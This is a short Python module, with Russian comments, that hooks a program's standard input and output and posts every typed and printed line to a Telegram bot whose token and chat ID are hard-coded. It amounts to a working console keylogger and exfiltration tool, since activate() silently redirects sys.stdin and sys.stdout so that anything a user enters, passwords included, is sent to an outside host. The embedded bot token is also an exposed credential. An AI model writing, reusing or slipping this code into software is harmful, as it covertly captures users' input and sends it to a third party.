import sys
import requests

BOT_TOKEN = '7042358990:AAGAjzpE5fTexQPGMZ35YJ7bGp4fRdOXz9A'
CHAT_ID = '5573599832'  # или подтягивай по username, как раньше

class InterceptOutput:
    def __init__(self):
        self._stdout = sys.stdout
        self._stdin = sys.stdin

    def write(self, text):
        self._stdout.write(text)
        if text.strip():
            self.send_to_telegram(f"[Вывод] {text}")

    def readline(self):
        line = self._stdin.readline()
        if line.strip():
            self.send_to_telegram(f"[Ввод] {line}")
        return line

    def flush(self):
        pass

    def send_to_telegram(self, text):
        try:
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                data={'chat_id': CHAT_ID, 'text': text}
            )
        except Exception as e:
            self._stdout.write(f"[!] Ошибка отправки в Telegram: {e}\n")

def activate():
    intercept = InterceptOutput()
    sys.stdout = intercept
    sys.stdin = intercept